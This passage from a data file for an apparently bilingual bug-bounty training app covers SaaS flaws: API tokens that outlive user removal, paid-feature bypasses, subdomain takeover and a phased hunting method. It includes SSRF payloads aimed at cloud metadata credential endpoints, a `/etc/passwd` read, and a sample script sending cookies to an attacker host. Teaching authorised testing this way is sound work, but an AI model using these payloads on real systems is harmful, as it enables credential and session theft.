    cwe: "CWE-284: Improper Access Control",
    vrt: "Server-Side Injection > Insufficient Authorization",
    bountyRange: "$1,500 – $6,000 (P2/P1)",
    severity: "high",
    summary: {
      en: "SaaS platforms allow developers and integrations to generate Personal Access Tokens (PATs) and workspace API keys. When an employee is removed or demoted from an organization, backends frequently revoke their web sessions but fail to cascade revocation to their active API keys and webhooks.",
      simple: "When a team member is fired or removed from a company, the software logs them out on the website, but forgets to cancel their secret developer API keys, leaving a permanent backdoor.",
      hi: "जब किसी कर्मचारी को कंपनी के वर्कस्पेस से हटा दिया जाता है, तो वेबसाइट उसका पासवर्ड और सेशन तो बंद कर देती है, लेकिन उसके द्वारा बनाई गई API Keys और पर्सनल टोकन्स (PAT) हमेशा एक्टिव रहते हैं और वो कंपनी का डेटा हमेशा चुरा सकता है।",
    },
    scenarios: [
      {
        title: {
          en: "Persistent API Key Access Post-Organization Removal (Zombie PAT)",
          simple: "Using API Key After Being Kicked Out of the Company",
          hi: "वर्कस्पेस से निकाल दिए जाने के बाद भी API Key से कंपनी का डेटा पढ़ना",
        },
        description: {
          en: "User A creates an API token (`pat_live_9921`) with full read/write privileges in Tenant Alpha. The Tenant Owner removes User A from the workspace. User A's browser session is destroyed, but making requests with `Authorization: Bearer pat_live_9921` continues returning 200 OK with full company data.",
          simple: "Make an API token, have another admin remove you from the workspace, and verify your API token still works.",
          hi: "एक API टोकन बनाएं, फिर ओनर से खुद को रिमूव करवाएं। चेक करें कि क्या आपका पुराना API टोकन अभी भी काम कर रहा है।",
        },
        requestSample: `GET /api/v1/workspace/customers HTTP/1.1
Host: saas-platform.com
Authorization: Bearer pat_live_992182019a
X-Org-ID: org_alpha_victim`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{
  "total": 450,
  "customers": [
    {"name": "Client Alpha", "contract_value": 75000},
    {"name": "Client Beta", "contract_value": 120000}
  ]
}`,
        impact: {
          en: "Unauthorized ex-employee data theft, compliance failure under HIPAA/SOC2 access revocation requirements.",
          simple: "Disgruntled ex-employees can steal confidential company client data indefinitely.",
          hi: "कंपनी छोड़ने वाले कर्मचारी कंपनी का गुप्त क्लाइंट डेटा और कॉन्ट्रैक्ट्स कभी भी डाउनलोड कर सकते हैं।",
        },
      },
      {
        title: {
          en: "Scope Escalation: Read-Only Scoped API Key Executing Write & Admin Actions",
          simple: "Using a Read-Only API Key to Perform Delete or Admin Tasks",
          hi: "सिर्फ 'Read-Only' परमिशन वाली API Key से डेटा डिलीट या मॉडिफाई करना",
        },
        description: {
          en: "A user generates a scoped API token with only `audit:read` permissions. When submitting a `DELETE /api/v1/projects/proj_101` or `POST /api/v1/users/invite` using this read-only token, the backend checks authentication but omits scope validation (`hasScope('audit:read')` instead of `hasScope('project:delete')`).",
          simple: "A read-only key can delete entire projects because the server only checked if the key is valid, not what it's allowed to do.",
          hi: "रीड-ओनली की से पूरे प्रोजेक्ट्स डिलीट हो जाते हैं क्योंकि सर्वर ने सिर्फ यह देखा कि की वैलिड है या नहीं, उसका स्कोप चेक नहीं किया।",
        },
        requestSample: `DELETE /api/v1/projects/proj_enterprise_99 HTTP/1.1
Host: saas-platform.com
Authorization: Bearer pat_readonly_audit_scope
Content-Type: application/json`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{
  "deleted": true,
  "project_id": "proj_enterprise_99",
  "status": "purged"
}`,
        impact: {
          en: "Least privilege violation leading to unauthorized destructive data modifications via compromised low-privilege service tokens.",
          simple: "Low-privilege integration keys can cause catastrophic accidental or malicious data destruction.",
          hi: "कम परमिशन वाले टोकन से भी पूरा डेटा नष्ट (Delete) किया जा सकता है।",
        },
      },
    ],
    testingRecipe: [
      {
        en: "1. Generate an API token or Personal Access Token (PAT) with minimal/read-only permissions in Organization A.",
        simple: "1. Create an API token with read-only permissions.",
        hi: "1. आर्गेनाईजेशन A में सबसे कम (Read-only) परमिशन वाला एक API टोकन बनाएं।",
      },
      {
        en: "2. Demote the user account to Guest or remove the user account completely from the organization using the Admin account.",
        simple: "2. Have an admin kick that user out of the organization.",
        hi: "2. एडमिन अकाउंट से उस यूज़र को वर्कस्पेस से पूरी तरह रिमूव कर दें।",
      },
      {
        en: "3. Re-test the API token against protected endpoints. If it still functions, report P2/P1 Ghost Access.",
        simple: "3. Test if the API token still fetches data after the user was kicked out.",
        hi: "3. रिमूव होने के बाद उसी API टोकन से डेटा फेच करें। अगर डेटा आ रहा है, तो यह P2/P1 बग है।",
      },
      {
        en: "4. Test scope enforcement: try modifying billing, inviting users, or deleting projects with a read-only token.",
        simple: "4. Try to delete or edit things using a read-only token.",
        hi: "4. सिर्फ पढ़ने वाले टोकन से एडिट और डिलीट करने की कोशिश करें और स्कोप बाईपास चेक करें।",
      },
    ],
    burpRules: [
      "Add custom header `Authorization: Bearer <token>` in Burp Repeater to rapidly fuzz multiple API endpoints.",
      "Check if API keys are validated in stateless JWT format vs cached in Redis without invalidation hooks.",
      "Look for API keys exposed in client-side frontend JavaScript bundles or source maps (`app.*.js`).",
    ],
    hunterProTip: {
      en: "Test token regeneration and revocation! When a user clicks 'Revoke API Key' or 'Regenerate API Key', does the old key immediately stop working? In many SaaS architectures using distributed caching or long-lived JWTs, revoked keys remain valid for 24-72 hours!",
      simple: "When you click 'Revoke Token', does it really stop working immediately? Test if the old token still works due to slow cache updates!",
      hi: "टोकन 'Revoke' या 'Regenerate' करने के बाद तुरंत पुराने टोकन को चलाकर देखें! बहुत सारे SaaS ऐप्स में कैशे (Redis/CDN) की वजह से डिलीट किया हुआ टोकन अगले 24 से 72 घंटे तक चलता रहता है!",
    },
  },
  {
    id: "subscription-feature-gate-bypass",
    title: {
      en: "Feature Gate & Subscription Tier Bypasses (Free Tier to Enterprise)",
      simple: "Unlock Enterprise Paid Features for Free by Direct API Calls",
      hi: "सब्सक्रिप्शन और फ़ीचर गेट बाईपास (फ्री टियर में एंटरप्राइज फ़ीचर्स चलाना)",
    },
    cwe: "CWE-863: Incorrect Authorization",
    vrt: "Server-Side Injection > Business Logic Flaw > Feature Access Bypass",
    bountyRange: "$1,500 – $7,500 (P2/P1)",
    severity: "high",
    summary: {
      en: "SaaS products segment features across Free, Pro, and Enterprise subscription tiers (e.g. Audit Logs, Custom Branding, SAML SSO, Unlimited Team Seats). Often, tier restrictions are enforced only on the frontend by greying out buttons or displaying upgrade modals, while the backend API endpoints execute the paid feature without verifying the organization's subscription status.",
      simple: "SaaS companies charge high fees for Enterprise features like SSO or custom branding. But often they only hide the buttons in your browser, and if you send the API request directly, the server enables the paid features for free.",
      hi: "SaaS कंपनियाँ एंटरप्राइज़ प्लान्स (जैसे कस्टम डोमेन, SSO, अनलिमिटेड सीट्स) के लिए हज़ारों डॉलर चार्ज करती हैं। कई बार वो सिर्फ ब्राउज़र में बटन को डिसेबल करती हैं, लेकिन अगर आप सीधे API रिक्वेस्ट भेजें तो फ्री अकाउंट पर भी वो सारे महंगे फीचर्स एक्टिवेट हो जाते हैं।",
    },
    scenarios: [
      {
        title: {
          en: "Enabling Enterprise SAML SSO and Custom Domains on a Free Tier Account",
          simple: "Activating Paid Enterprise SSO on a Free Plan",
          hi: "फ्री प्लान पर एंटरप्राइज SSO और कस्टम डोमेन एक्टिवेट करना",
        },
        description: {
          en: "On the web UI, the 'Configure SAML SSO' page is locked behind an 'Upgrade to Enterprise ($499/mo)' banner. The attacker opens browser DevTools, captures the network schema, and issues a direct `POST /api/v1/workspaces/{id}/sso/saml` request with their IdP XML. The backend saves the configuration and activates SSO on the Free tier.",
          simple: "Send the backend request to set up SSO directly without clicking the upgrade button, getting $500/month features for free.",
          hi: "बिना प्लान अपग्रेड किए सीधे API पर SAML कॉन्फ़िगरेशन भेजकर $500/महीने वाला एंटरप्राइज फ़ीचर फ्री अकाउंट पर चालू करना।",
        },
        requestSample: `POST /api/v1/workspaces/ws_free_9901/sso/saml HTTP/1.1
Host: cloudplatform.io
Authorization: Bearer <Free_Tier_Owner_Token>
Content-Type: application/json

{
  "enabled": true,
  "idp_entity_id": "https://identity.attacker.com/saml",
  "idp_sso_url": "https://identity.attacker.com/sso",
  "enforce_sso": true,
  "custom_domain": "auth.attackercompany.com"
}`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{
  "success": true,
  "sso_status": "ACTIVE",
  "custom_domain": "auth.attackercompany.com",
  "plan_override": true
}`,
        impact: {
          en: "Direct financial loss and business model bypass by enabling multi-thousand-dollar Enterprise capabilities on zero-dollar accounts.",
          simple: "Stealing expensive enterprise software capabilities without paying the subscription.",
          hi: "कंपनी के बिज़नेस मॉडल को नुकसान; बिना कोई पैसा दिए हज़ारों डॉलर के प्रीमियम फीचर्स का अवैध इस्तेमाल।",
        },
      },
      {
        title: {
          en: "Seat License Race Condition: Bypassing Maximum User Limits on Paid Plans",
          simple: "Adding Unlimited Team Members Without Paying for Extra Seats",
          hi: "सीट लिमिट बाईपास (रेस कंडीशन के ज़रिये बिना पैसे दिए अनलिमिटेड मेंबर्स जोड़ना)",
        },
        description: {
          en: "A paid plan allows exactly 5 team seats. The attacker sends 30 simultaneous invitation accept requests in parallel using HTTP/2 single-packet multiplexing. Due to a race condition between checking seat count and incrementing member rows, all 30 members join successfully without seat overage billing.",
          simple: "Send 30 team invite accepts at the exact same millisecond to bypass the 5-person plan limit.",
          hi: "एक साथ 30 इनविटेशन एक्सेप्ट रिक्वेस्ट भेजकर 5-सीट वाले प्लान में 30 यूज़र्स जोड़ लेना बिना कोई अतिरिक्त शुल्क दिए।",
        },
        requestSample: `POST /api/v1/invitations/accept HTTP/1.1
Host: saasapp.com
Authorization: Bearer <Invited_User_Token>
Content-Type: application/json

{"invite_token": "inv_token_99182"}`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{"joined": true, "workspace_seats_used": 30, "workspace_seats_limit": 5}`,
        impact: {
          en: "Circumventing per-seat SaaS monetization limits, allowing enterprise-scale usage on starter licenses.",
          simple: "Companies can use thousands of paid seats on a basic 5-seat subscription.",
          hi: "बिना प्रति-सीट लाइसेंस फीस दिए अनलिमिटेड यूज़र्स जोड़ना, जिससे SaaS प्रोवाइडर का भारी आर्थिक नुकसान होता है।",
        },
      },
    ],
    testingRecipe: [
      {
        en: "1. Create a Free or Starter tier organization and browse the UI to identify every greyed-out or 'Upgrade to Pro/Enterprise' feature.",
        simple: "1. On a free account, find all buttons that say 'Upgrade to Enterprise'.",
        hi: "1. फ्री अकाउंट में वो सारे फीचर्स और सेटिंग्स देखें जहाँ 'Upgrade to Enterprise' लिखा हुआ है।",
      },
      {
        en: "2. Inspect the frontend JavaScript files or API documentation (Swagger/OpenAPI) to find the backend endpoints corresponding to those locked features.",
        simple: "2. Check developer docs or JavaScript files to find the secret API URL for that locked feature.",
        hi: "2. जावास्क्रिप्ट फ़ाइल्स या Swagger डॉक्स में उन लॉक्ड फीचर्स के असली API एंडपॉइंट्स खोजें।",
      },
      {
        en: "3. Send direct POST/PUT/PATCH requests from your Free account to those endpoints with valid payload structures.",
        simple: "3. Send requests directly to those locked endpoints from your free account.",
        hi: "3. अपने फ्री अकाउंट से सीधे उन एंडपॉइंट्स पर POST/PUT रिक्वेस्ट्स भेजें।",
      },
      {
        en: "4. Test seat limit race conditions using Turbo Intruder or Burp Repeater Parallel Requests when accepting invitations.",
        simple: "4. Test race conditions when inviting more members than your plan allows.",
        hi: "4. Turbo Intruder से एक साथ कई इनविटेशन एक्सेप्ट भेजकर चेक करें कि क्या सीट लिमिट पार हो जाती है।",
      },
    ],
    burpRules: [
      "Search response bodies for feature flag objects (e.g. `\"features\": {\"sso\": false, \"audit_logs\": false, \"max_seats\": 5}`).",
      "Test modifying client-side responses in Burp Proxy (HTTP response tampering) to set feature flags to `true` and see which backend endpoints get activated.",
      "Send negative numbers or boundary numbers in seat/license update requests (e.g. `\"seats\": -1`, `\"seats\": 0`, or `\"seats\": 99999999`).",
    ],
    hunterProTip: {
      en: "Look for trial downgrade logic! When a 14-day Enterprise Trial expires, SaaS apps transition the account to Free. However, features that were already enabled during the trial (e.g. custom Webhooks, SSO, API integrations, additional team members) often remain running and active in the background forever!",
      simple: "Sign up for a free Enterprise Trial, enable all premium features, let the trial expire, and see if the premium features continue working for free!",
      hi: "14 दिन का फ्री 'Enterprise Trial' लें और उसमें सारे प्रीमियम फीचर्स (SSO, Webhooks, 20 टीम मेंबर्स) एक्टिवेट कर लें। जब ट्रायल खत्म होकर अकाउंट फ्री हो जाए, तो चेक करें कि क्या वो पुराने एक्टिवेटेड फीचर्स अभी भी बैकएंड पर बिना किसी रोक-टोक के चल रहे हैं!",
    },
  },
  {
    id: "subdomain-cname-takeover",
    title: {
      en: "Custom Domain & Subdomain Takeovers in Multi-Tenant Routing",
      simple: "Take Over Deleted SaaS Subdomains and Steal Authentication Cookies",
      hi: "कस्टम डोमेन व सबडोमेन टेकओवर (हटाए गए टेनेंट डोमेन से कुकीज़ चुराना)",
    },
    cwe: "CWE-284: Improper Access Control",
    vrt: "Server-Side Injection > Subdomain Takeover",
    bountyRange: "$1,000 – $5,000 (P2/P1)",
    severity: "high",
    summary: {
      en: "SaaS products provide custom tenant routing via wildcard subdomains (`{tenant}.saas.com`) or custom CNAME mapping (`app.customer.com` -> `custom.saas.com`). When customers delete their workspace or abandon their subscription without cleaning up their DNS CNAME records, attackers can claim the orphaned tenant slug, serving malicious phishing pages and harvesting session cookies configured on parent domains (`.saas.com`).",
      simple: "When a company cancels their SaaS subscription but forgets to remove their website CNAME link, anyone can register that company name inside the SaaS and steal company login cookies.",
      hi: "जब कोई कंपनी अपनी SaaS सब्सक्रिप्शन बंद कर देती है लेकिन अपने DNS से CNAME रिकॉर्ड डिलीट करना भूल जाती है, तो कोई भी अटैकर उस कंपनी का नाम दोबारा रजिस्टर करके उनकी वेबसाइट पर फ़िशिंग पेज चला सकता है और कुकीज़ चुरा सकता है।",
    },
    scenarios: [
      {
        title: {
          en: "Dangling CNAME Takeover on SaaS Custom Domain Ingress",
          simple: "Claiming an Abandoned Enterprise Custom Domain",
          hi: "कंपनी के भूले हुए CNAME रिकॉर्ड को अपने SaaS अकाउंट में क्लेम करना",
        },
        description: {
          en: "Enterprise Customer points `portal.enterprise.com` CNAME to `domains.saascloud.com`. Later, the enterprise closes its SaaS account. The DNS CNAME remains active. The attacker registers a new free account on the SaaS, adds `portal.enterprise.com` as their custom domain without domain ownership verification (no TXT verification), taking over the enterprise's official URL.",
          simple: "An abandoned domain still points to the SaaS. Attacker adds that domain to their own free account and controls the enterprise's website.",
          hi: "कंपनी का पुराना डोमेन अभी भी SaaS पर पॉइंट कर रहा है। अटैकर अपने फ्री अकाउंट में वही डोमेन जोड़कर बिना किसी वेरिफिकेशन के उस पर अपना कंट्रोल कर लेता है।",
        },
        requestSample: `POST /api/v1/domains/custom HTTP/1.1
Host: saascloud.com
Authorization: Bearer <Attacker_Account_Token>
Content-Type: application/json

{
  "domain": "portal.target-enterprise.com",
  "workspace_id": "ws_attacker_free"
}`,
        responseSample: `HTTP/1.1 201 Created
Content-Type: application/json

{
  "domain": "portal.target-enterprise.com",
  "status": "VERIFIED_ACTIVE",
  "ssl_certificate": "PROVISIONED_LETS_ENCRYPT"
}`,
        impact: {
          en: "Full high-reputation domain takeover, enabling credential harvesting, malware delivery, and session cookie interception.",
          simple: "Attacker can host phishing on the real corporate domain with legitimate SSL certificates.",
          hi: "अटैकर असली कॉर्पोरेट डोमेन पर लीगल SSL सर्टिफिकेट के साथ फ़िशिंग और लॉगिन क्रेडेंशियल्स चुरा सकता है।",
        },
      },
      {
        title: {
          en: "Parent Domain Cookie Hijacking via Tenant Subdomain Creation",
          simple: "Stealing Main Site Login Cookies Using a Custom Subdomain",
          hi: "सबडोमेन बनाकर मेन वेबसाइट की सेशन कुकीज़ चुराना (Parent Cookie Leakage)",
        },
        description: {
          en: "The SaaS application sets authentication cookies with `Domain=.saasplatform.com` (wildcard scope). An attacker registers `evil-tenant.saasplatform.com` and hosts custom HTML/JavaScript or an open redirect. Because the session cookie is scoped to `.saasplatform.com`, the victim's browser automatically sends their session cookie to `evil-tenant.saasplatform.com`.",
          simple: "Because cookies are shared across all subdomains, creating your own subdomain lets you read login cookies of users visiting your link.",
          hi: "क्योंकि सेशन कुकीज़ पूरे `.saasplatform.com` डोमेन पर शेयर्ड होती हैं, अटैकर अपना सबडोमेन बनाकर आने वाले यूज़र्स की मेन लॉगिन कुकीज़ चुरा लेता है।",
        },
        requestSample: `GET / HTTP/1.1
Host: evil-tenant.saasplatform.com
Cookie: saas_auth_session=victim_corp_session_token_xyz99; Domain=.saasplatform.com`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: text/html

<script>
  fetch("https://attacker-c2.com/log?cookie=" + encodeURIComponent(document.cookie));
</script>`,
        impact: {
          en: "Cross-tenant account takeover and mass corporate session theft via loose cookie domain scoping.",
          simple: "Allows stealing any user's login session who clicks on a link within the SaaS domain.",
          hi: "गलत कुकी स्कोपिंग की वजह से किसी भी यूज़र का पूरा अकाउंट हाइजैक हो जाता है।",
        },
      },
    ],
    testingRecipe: [
      {
        en: "1. Enumerate all subdomains of the target SaaS platform using sublist3r, amass, and crt.sh (`*.target-saas.com`).",
        simple: "1. Find all subdomains of the SaaS company.",
        hi: "1. टार्गेट SaaS के सारे सबडोमेन खोजें (`*.target-saas.com`)।",
      },
      {
        en: "2. Check for HTTP 404/502 errors showing SaaS tenant messages like 'Tenant not found' or 'This workspace does not exist'.",
        simple: "2. Look for 404 pages that say 'Workspace does not exist'.",
        hi: "2. 404 या 502 एरर वाले सबडोमेन देखें जहाँ 'Tenant not found' लिखा हो।",
      },
      {
        en: "3. Check if you can register an organization with that exact deleted slug to claim the subdomain.",
        simple: "3. Try creating a new workspace with that same abandoned name.",
        hi: "3. उसी नाम से नया वर्कस्पेस रजिस्टर करके चेक करें कि क्या वो सबडोमेन आपको मिल जाता है।",
      },
      {
        en: "4. Check cookies on the main app: If `Domain=.saas.com` is present, report Parent Domain Cookie Scoping Risk.",
        simple: "4. Inspect cookie settings to see if cookies are sent to all subdomains.",
        hi: "4. मेन ऐप की कुकीज़ देखें कि क्या उसमें `Domain=.saas.com` लगा है।",
      },
    ],
    burpRules: [
      "Inspect Set-Cookie headers in proxy history for loose `Domain=.domain.com` flags.",
      "Check custom domain addition requests for missing DNS challenge token validation (`_saas-challenge.customer.com`).",
    ],
    hunterProTip: {
      en: "Whenever a SaaS allows adding a custom domain (e.g. `docs.mycompany.com`), always test whether you can claim a domain WITHOUT verifying ownership! If the platform immediately routes traffic to your workspace just because you typed the domain name, that is an immediate high-severity finding!",
      simple: "When adding a custom domain, check if the app lets you claim it without requiring you to add a DNS TXT verification record first!",
      hi: "जब भी कोई SaaS कस्टम डोमेन जोड़ने की सुविधा दे, तो चेक करें कि क्या वो डोमेन ओनरशिप (DNS TXT रिकॉर्ड) को सच में वेरिफाई करता है या सिर्फ नाम टाइप करते ही ट्रैफिक आपकी तरफ मोड़ देता है! यह सीधा हाई-सेवेरिटी बग है!",
    },
  },
];

// ─── 2. 48-HOUR SAAS HUNTING METHODOLOGY ─────────────────────────────────────
export const SAAS_METHODOLOGY_PHASES: SaaSPhase[] = [
  {
    phase: 1,
    title: {
      en: "Phase 1: Multi-Tenant Architecture & Domain Recon (Hours 0 – 6)",
      simple: "Understand the Target's Structure and Multi-Tenant Setup",
      hi: "फेज़ 1: मल्टी-टेनेंट आर्किटेक्चर व डोमेन मैपिंग (घंटे 0 – 6)",
    },
    objective: {
      en: "Identify how the SaaS partitions organizations: subdomain-based (`org.app.com`), path-based (`app.com/org`), or header-based (`X-Tenant-ID`), and discover all hidden API services.",
      simple: "Find out how the company separates different customers and locate all secret API endpoints.",
      hi: "पता लगाएं कि SaaS कंपनी अलग-अलग ग्राहकों को कैसे अलग रखती है: सबडोमेन से, URL पाथ से, या हेडर से, और सभी API एंडपॉइंट्स खोजें।",
    },
    steps: [
      {
        en: "Enumerate wildcards and services using Subfinder, crt.sh, and Amass (`subfinder -d targetsaas.com -all`).",
        simple: "Find all subdomains used by the target.",
        hi: "Subfinder और crt.sh से टार्गेट के सभी सबडोमेन खोजें।",
      },
      {
        en: "Identify API gateways, authentication portals, and admin ingress endpoints (`api.*`, `auth.*`, `admin.*`, `portal.*`).",
        simple: "Pinpoint login portals and API services.",
        hi: "लॉगिन पोर्टल्स और API गेटवे एंडपॉइंट्स को मार्क करें।",
      },
      {
        en: "Inspect frontend JavaScript bundles (`main.*.js`, `chunk-*.js`) for internal API routes, hidden feature flags, and tenant header names.",
        simple: "Read website JavaScript code to find hidden endpoints and feature names.",
        hi: "जावास्क्रिप्ट कोड पढ़कर अंदरूनी API रूट्स और छिपे हुए फ़ीचर फ़्लैग्स निकालें।",
      },
    ],
    commandsOrPayloads: [
      "subfinder -d targetsaas.com -silent | httpx -title -status-code -tech-detect",
      "katana -u https://app.targetsaas.com -d 3 -jc | grep -E '\\.json|/api/|/v1/|/v2/'",
      "gau targetsaas.com | grep -E '/workspaces/|/organizations/|/invitations/' | head -n 30",
    ],
    keyTargets: [
      "Multi-tenant identifier format (UUID vs Integer vs Slug)",
      "Single Sign-On (SAML/OAuth) callback URLs",
      "Outbound integration webhook endpoints",
    ],
  },
  {
    phase: 2,
    title: {
      en: "Phase 2: The 2-Tenant / 4-User Test Matrix Setup (Hours 6 – 12)",
      simple: "Create 2 Companies with 4 Accounts for Testing Permissions",
      hi: "फेज़ 2: दो कंपनियाँ और 4 टेस्ट अकाउंट्स का सेटअप (घंटे 6 – 12)",
    },
    objective: {
      en: "Construct the gold standard SaaS testing laboratory: 2 completely separate organizations with varying privilege tiers to test cross-tenant and vertical authorization boundaries.",
      simple: "Set up 2 different test organizations with high and low roles to systematically test permissions.",
      hi: "परीक्षण के लिए 2 अलग कंपनियाँ बनाएं और हर एक में एडमिन व साधारण यूज़र का अकाउंट सेटअप करें।",
    },
    steps: [
      {
        en: "Register Tenant A (Attacker Org): Create User A1 (Owner) and User A2 (Viewer/Member).",
        simple: "Create Company A with an Owner and a normal Member.",
        hi: "कंपनी A (अटैकर) बनाएं: यूज़र A1 (Owner) और यूज़र A2 (Member)।",
      },
      {
        en: "Register Tenant B (Victim Org): Create User B1 (Owner) and User B2 (Member).",
        simple: "Create Company B with an Owner and a normal Member.",
        hi: "कंपनी B (विक्टिम) बनाएं: यूज़र B1 (Owner) और यूज़र B2 (Member)।",
      },
      {
        en: "Populate Tenant B with distinct realistic data: invoices, sensitive documents, private team channels, and API tokens.",
        simple: "Add dummy confidential documents and team members to Company B.",
        hi: "कंपनी B में टेस्ट के लिए कुछ फ़ाइलें, इनवॉइस और सीक्रेट डेटा डालें।",
      },
    ],
    commandsOrPayloads: [
      "# Keep 2 separate browser profiles open (e.g. Firefox Multi-Account Containers):",
      "Container 1: Tenant A (Attacker)",
      "Container 2: Tenant B (Victim)",
    ],
    keyTargets: [
      "Tenant A Workspace UUID vs Tenant B Workspace UUID",
      "Owner Session Cookies vs Member Session Cookies",
    ],
  },
  {
    phase: 3,
    title: {
      en: "Phase 3: Automated & Manual Authorization Matrix Fuzzing (Hours 12 – 24)",
      simple: "Test Every API Endpoint to See If Other Companies' Data Leaks",
      hi: "फेज़ 3: ऑटोमैटिक व मैन्युअल ऑथराइजेशन मैट्रिक्स टेस्टिंग (घंटे 12 – 24)",
    },
    objective: {
      en: "Systematically test both horizontal isolation (cross-tenant access) and vertical authorization (privilege escalation) across all collected endpoints.",
      simple: "Check if swapping company IDs or user roles allows unauthorized access.",
      hi: "सिस्टम के हर एंडपॉइंट पर ID बदलकर और रोल बदलकर चेक करें कि क्या परमिशन बाईपास होती है।",
    },
    steps: [
      {
        en: "Configure the Autorize Burp Suite extension with Tenant A's session token while actively browsing Tenant B as an Admin.",
        simple: "Use the Autorize extension in Burp to automatically test every click with the other account's cookies.",
        hi: "Burp में Autorize एक्सटेंशन चालू करें और कंपनी B में ब्राउज़ करते समय कंपनी A के कुकीज़ से ऑटोमैटिक टेस्ट करें।",
      },
      {
        en: "Test GraphQL operations: Send introspection queries, check for hidden admin mutations (`deleteOrganization`, `exportAllData`), and test alias batching.",
        simple: "Check GraphQL requests for hidden admin commands.",
        hi: "GraphQL में छिपे हुए एडमिन म्यूटेशंस खोजें और टेस्ट करें।",
      },
      {
        en: "Manually replay REST requests in Burp Repeater modifying `org_id`, `workspace_id`, and `account_id` in URL paths and JSON bodies.",
        simple: "Manually swap workspace IDs in requests to verify data leaks.",
        hi: "Burp Repeater में मैन्युअल रूप से workspace_id बदलकर चेक करें।",
      },
    ],
    commandsOrPayloads: [
      "# Autorize match & replace rule for SaaS headers:",
      "Replace: X-Tenant-Id: <Tenant_B_UUID>",
      "With:    X-Tenant-Id: <Tenant_A_UUID>",
    ],
    keyTargets: [
      "/api/v1/workspaces/{id}/export",
      "/api/v1/billing/invoices/{id}.pdf",
      "/api/v1/members/{user_id}/permissions",
    ],
  },
  {
    phase: 4,
    title: {
      en: "Phase 4: Integrations, Outbound Webhooks & SSRF (Hours 24 – 36)",
      simple: "Test Outbound Webhooks and Cloud Metadata Access",
      hi: "फेज़ 4: आउटबाउंड वेबहुक्स और SSRF की गहराई से टेस्टिंग (घंटे 24 – 36)",
    },
    objective: {
      en: "Exploit server-side request features to breach network perimeters, steal cloud IAM credentials, and pivot into private VPC internal microservices.",
      simple: "Use features where the server visits a URL to test if it can access secret cloud files or internal services.",
      hi: "वेबहुक और URL फ़ीचर्स के ज़रिये सर्वर से इंटरनल क्लाउड मेटाडेटा और अंदरूनी सर्वर्स पर हमला करें।",
    },
    steps: [
      {
        en: "Trigger all webhook creation and 'Test Webhook' endpoints using an Interactsh listener.",
        simple: "Provide your test listener URL to all webhook and notification features.",
        hi: "सभी वेबहुक और नोटिफिकेशन फ़ीचर्स में अपना Interactsh लिंक डालकर पिंग चेक करें।",
      },
      {
        en: "Test IP blacklist bypasses against AWS (`169.254.169.254`), GCP (`metadata.google.internal`), and Kubernetes (`kubernetes.default.svc`).",
        simple: "Test cloud metadata IPs with hex and decimal encoding bypasses.",
        hi: "AWS, GCP और Kubernetes के मेटाडेटा पतों को विभिन्न एन्कोडिंग तकनीकों से बाईपास करें।",
      },
      {
        en: "Inspect PDF generation tools, avatars from URL, and image upload by URL features for SSRF and Local File Inclusion (`file:///etc/passwd`).",
        simple: "Test PDF generators and URL avatar uploads for secret file reading.",
        hi: "PDF एक्सपोर्ट और अवतार अपलोड में SSRF और फ़ाइल रीडिंग टेस्ट करें।",
      },
    ],
    commandsOrPayloads: [
      "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      "http://2852039166/latest/meta-data/",
      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    ],
    keyTargets: [
      "/api/v1/webhooks/test",
      "/api/v1/export/pdf",
      "/api/v1/integrations/slack/events",
    ],
  },
  {
    phase: 5,
    title: {
      en: "Phase 5: Offboarding, Token Persistence & Race Conditions (Hours 36 – 48)",
      simple: "Test What Happens When Accounts Are Removed or Flooded in Parallel",
      hi: "फेज़ 5: ऑफ़बोर्डिंग, टोकन परसिस्टेंस और रेस कंडीशंस (घंटे 36 – 48)",
    },
    objective: {
      en: "Identify persistence flaws when users leave or get demoted, and find business logic race conditions in invitation acceptance and seat allocation.",
      simple: "Check if deleted users can still access data and if sending parallel requests creates free seats.",
      hi: "चेक करें कि हटाए गए यूज़र्स के टोकन्स अभी भी चलते हैं या नहीं, और क्या रेस कंडीशन से फ्री सीट्स मिलती हैं।",
    },
    steps: [
      {
        en: "Create Personal Access Tokens (PATs) and OAuth app connections as a low-privilege member, remove that member, and test if the tokens still function.",
        simple: "Create an API key, get kicked from the company, and test if the API key still works.",
        hi: "एक API की बनाएं, खुद को वर्कस्पेस से निकलवाएं, और चेक करें कि क्या वो की अभी भी काम करती है।",
      },
      {
        en: "Use Turbo Intruder with HTTP/2 single-packet attack to accept multiple team invites simultaneously beyond license seat limits.",
        simple: "Send parallel requests to accept team invites and see if you exceed plan limits.",
        hi: "Turbo Intruder से एक साथ कई इनविटेशन एक्सेप्ट भेजकर लाइसेंस लिमिट पार करें।",
      },
      {
        en: "Test SAML SSO Just-In-Time (JIT) provisioning attribute tampering for instant Owner rights.",
        simple: "Test modifying SAML roles during first-time SSO login.",
        hi: "SSO पहली बार लॉगिन करते समय SAML रिस्पॉन्स में रोल बदलकर ओनर बनें।",
      },
    ],
    commandsOrPayloads: [
      "# Test API token after member removal:",
      "curl -H 'Authorization: Bearer <ghost_pat>' https://api.saasapp.com/v1/projects",
    ],
    keyTargets: [
      "/api/v1/invitations/accept",
      "/api/v1/tokens/revoke",
      "/api/v1/subscription/seats",
    ],
  },
];

// ─── 3. SAAS ATTACK LAB & AUTOMATION SCRIPTS ─────────────────────────────────
export const SAAS_TOOLS_STASH: SaaSToolSnippet[] = [
  {
    id: "autorize-saas-config",
    title: {
      en: "Autorize Match/Replace Configuration for SaaS Multi-Tenancy",
      simple: "Burp Autorize Setup to Automatically Catch SaaS IDOR/BOLA",
      hi: "SaaS मल्टी-टेनेंसी IDOR पकड़ने के लिए Burp Autorize कॉन्फ़िगरेशन",
    },
    description: {
      en: "Step-by-step Burp Autorize configuration specifically customized for multi-tenant SaaS headers and authorization tokens.",
      simple: "Settings to paste into Burp's Autorize tool so it automatically tests other companies' accounts while you browse.",
      hi: "Burp Autorize टूल में ये सेटिंग्स डालें जिससे आपके ब्राउज़ करते ही यह अपने आप चेक कर लेगा कि दूसरी कंपनी का डेटा लीक हो रहा है या नहीं।",
    },
    category: "autorize",
    language: "json",
    code: `{
  "autorize_instructions": [
    "1. Open Burp Suite -> Autorize Tab.",
    "2. In 'Temporary Headers', paste the Authorization header of Tenant A (Attacker):",
